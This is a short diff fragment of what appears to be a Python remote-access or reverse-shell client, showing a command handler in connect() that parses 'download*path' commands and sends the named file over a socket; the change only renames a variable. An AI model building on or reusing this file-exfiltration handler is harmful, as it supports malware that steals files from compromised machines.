@@ -45,7 +45,7 @@ def connect():
 # Example:  download*c:/file.exe
 
         elif 'download' in command:            
-            download,path = command.split('*')
+            grab,path = command.split('*')
             
             try:                         
                 transfer(s,path)
